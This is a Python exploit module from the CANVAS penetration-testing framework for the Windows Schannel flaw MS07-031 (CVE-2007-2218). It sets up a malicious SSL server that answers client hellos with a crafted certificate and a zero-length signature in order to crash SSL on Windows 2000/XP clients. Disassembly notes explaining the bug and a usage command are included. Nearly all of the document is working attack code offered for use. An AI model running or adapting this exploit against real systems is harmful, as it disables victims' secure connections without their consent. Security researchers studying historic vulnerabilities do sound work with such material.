#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME="Microsoft Schannel bug"
DESCRIPTION="""
From CVE: vulnerability in the Windows Schannel Security Package for 
Microsoft Windows 2000 SP4, XP SP2, and Server 2003 SP1 and SP2, allows 
remote servers to execute arbitrary code or cause a denial of service 
via crafted digital signatures that are processed during an SSL 
handshake."""
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='06/12/07'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS07-031.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-2218'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2218'
DOCUMENTATION['CVSS'] = 9.3

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV'] = "MS07-031"

NOTES="""
This PoC will only support SSLv3 Client Hello packets.

Thomas Lim mail:
http://lists.grok.org.uk/pipermail/full-disclosure/2007-June/063948.html

Under Windows 2000:
.text:78170D6C                 movzx   eax, byte ptr [ecx]
.text:78170D6F                 movzx   esi, byte ptr [ecx+1]
.text:78170D73                 shl     eax, 8
.text:78170D76                 add     esi, eax
.text:78170D78                 lea     eax, [esi+edx]
.text:78170D7B                 cmp     eax, [ebp+dwDataLen]
.text:78170D7E                 ja      short loc_78170D8B
.text:78170D80                 cmp     esi, 226h
.text:78170D86                 lea     eax, [ecx+2]
.text:78170D89                 jbe     short loc_78170D92
...
.text:78170D92 loc_78170D92:                           ; CODE XREF: Ssl3ParseServerKeyExchange(x,x,x,x,x)+114j
.text:78170D92                 push    esi
.text:78170D93                 push    eax
.text:78170D94                 lea     eax, [ebp+pbSignature]
.text:78170D9A                 push    eax
.text:78170D9B                 call    _ReverseMemCopy@12 ; ReverseMemCopy(x,x,x)

It reads the signature length on 2 bytes, verifies if it is lower or equal to 0x226, then procedes
to a memory copy operation. Yet, if the length is 0, it will copy a byte of the buffer at pbSignature-1.

.text:78170C75 pbSignature     = byte ptr -25Ch
...
.text:78170C78                 sub     esp, 25Ch
.text:78170C7E                 mov     ecx, [ebp+arg_4]
.text:78170C81                 push    ebx

So we will overwrite the high byte of the ebx saved on the stack, which will be restored at the end of the
function and used in the parent function, causing an exception, killing the thread in charge of that kind
of things. So SSL can no longer be used. It's not obvious yet if it can be exploited to get remote code
execution.

Usage:
./exploits/ms07_031/ms07_031.py -t 10.10.11.1 -l 10.10.11.1 -d 5555 -v 1
"""

CHANGELOG="""
"""

import base64
from MOSDEF import mosdef
import canvasengine

targets = {
    0: ['Autodetect (N/A)',0],
    1: ['Windows 2000 (IE PoC)',0x41414141],
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=443
        self.badstring='\0'
        self.subesp=1000
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return 
    
    def createShellcode(self):
        self.log('Creating Win32 shellcode (Callback: %s:%d)'%(self.callback.ip,self.callback.port))
        self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def buildSSLResponse(self):
        hello=''
        hello+=struct.pack('>HL',0x300,time.time())
        hello+='A'*0x1c
        hello+=struct.pack('>B',0x20)
        hello+='B'*0x20
        hello+=struct.pack('>HB',0x0004,0x00)
        hello=struct.pack('>BBH',0x02,0x00,len(hello))+hello
        certificate=binstring('''0b 00 02 1e 00 02 1b 00 02 18 30
       82 02 14 30 82 01 7d a0 03 02 01 02 02 10 c0 84
       0c f9 35 d7 bf b8 4e 5e c7 c0 2c 0e a0 3a 30 0d
       06 09 2a 86 48 86 f7 0d 01 01 04 05 00 30 17 31
       15 30 13 06 03 55 04 03 13 0c 31 30 2e 31 30 2e
       31 31 2e 31 33 32 30 1e 17 0d 30 30 30 31 30 31
       30 37 30 30 30 30 5a 17 0d 33 36 30 31 30 31 30
       37 30 30 30 30 5a 30 17 31 15 30 13 06 03 55 04
       03 13 0c 31 30 2e 31 30 2e 31 31 2e 31 33 32 30
       81 9f 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05
       00 03 81 8d 00 30 81 89 02 81 81 00 af 1b e9 68
       00 22 78 86 f2 2a c7 8d 1f 7d bd c6 61 a0 0c db
       43 63 55 96 3c f3 8b ef 1d 47 d1 a2 4e 65 81 71
       a8 f1 34 1d 79 84 44 95 23 2a 2f 83 33 3e f9 ed
       20 d5 13 88 25 d2 58 30 07 79 d8 0d 5e fa d1 b6
       7a 9f 4b b9 c8 f8 6b 57 f6 13 70 14 8a a9 12 87
       68 bc 10 f2 ae 7e 2a 59 3c 45 ab 49 f3 1d 32 1f
       89 9d 1a 79 be 33 79 d2 a2 ed d8 6c de 83 ef ff
       21 83 63 66 50 d3 4e 26 57 aa 5f 3b 02 03 01 00
       01 a3 61 30 5f 30 13 06 03 55 1d 25 04 0c 30 0a
       06 08 2b 06 01 05 05 07 03 01 30 48 06 03 55 1d
       01 04 41 30 3f 80 10 fd f7 01 3b 8e 7c 32 da 36
       0f 09 af c1 cc da ce a1 19 30 17 31 15 30 13 06
       03 55 04 03 13 0c 31 30 2e 31 30 2e 31 31 2e 31
       33 32 82 10 c0 84 0c f9 35 d7 bf b8 4e 5e c7 c0
       2c 0e a0 3a 30 0d 06 09 2a 86 48 86 f7 0d 01 01
       04 05 00 03 81 81 00 05 38 69 98 53 16 df 4a 60
       7d 9b 3e 20 54 23 35 85 ab 85 ac af 4a 09 a9 14
       eb 85 5a 1a ff 0c ad bf e4 4c 44 76 7f 37 05 0d
       79 6f aa 0a d4 5d 0f 94 b6 4f 75 69 75 19 7c a3
       80 18 86 ba d8 68 96 2d cc 80 17 8a 27 a3 12 fe
       86 02 a6 f4 fb 95 17 85 50 9f bb c8 59 88 1b de
       77 6d 67 da 1c 11 09 fb a7 29 1e 4b 7c ac 1f 18
       b3 75 1d af 61 37 b5 26 b3 b1 bf 32 47 87 58 12
       6d 1d 52 d3 b8 23 db''')
	serverparams=''
	serverparams+=struct.pack('>H',0x0040) #modulus (>=0x40 <=0x100)
	serverparams+='C'*0x40
	serverparams+=struct.pack('>H',0x0004) #exponent size (>=1 <=4)
	serverparams+='D'*0x04
	signature=''
        signature+=struct.pack('>H',0x0000) #signature size (>=0 <= 0x226)
        signature+='\xff'*0x80
	keyexchange=serverparams+signature
	keyexchange=struct.pack('>BBH',0x0c,0x00,len(keyexchange))+keyexchange
        hellodone=''
        hellodone+=struct.pack('>BBH',0x0e,0x00,0x0000)
        result=hello+certificate+keyexchange+hellodone
        result=struct.pack('>BHH',0x16,0x300,len(result))+result
        return result

    def run(self):
        self.getArgs()

        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.setProgress(20)
        if self.port==0:
            self.test()
            if self.port==0:
                self.log('Media Server RPC service not found')
                return 0
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.writeable=targets[self.version]

        self.sock=self.gettcpsock()
	self.sock.set_timeout(60)
        try:
            self.log('bind(%s:%d)'%(self.host,self.port))
            self.sock.bind((self.host,self.port))
            self.sock.listen(1)
        except socket.error, msg:
            self.log('You might need to run this exploit as root: %s'%str(msg))
            return 0
        
        done=False
        while done==False:
            try:
                self.log('Waiting for new connection')
                csock,addr=self.sock.accept()
                self.log('Connection from %s:%d'%(addr[0],int(addr[1])))
                request=csock.recv(1024)
		print repr(request)
                packettype,sslversion=struct.unpack('>BH',request[:3]) #Only supports SSLv3 format
                print '%02x %04x'%(packettype,sslversion)
                if packettype==0x16 and sslversion==0x300:
                    response=self.buildSSLResponse()
                    csock.send(response)
                    unused=csock.recv(1024)
                    time.sleep(4)
                    done=True
                csock.close()
                #csock.shutdown(socket.SHUT_RDWR)
                self.log('Connection released')
            except timeoutsocket.Timeout, msg:
                self.log('Timeout reached. bailing out ...')
                done=True
            #except Exception, emsg:
            #    self.log('Unhandled exception caught: %s'%str(emsg))
            #    done=True

        self.setProgress(100)
        if self.ISucceeded():
            return 1

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
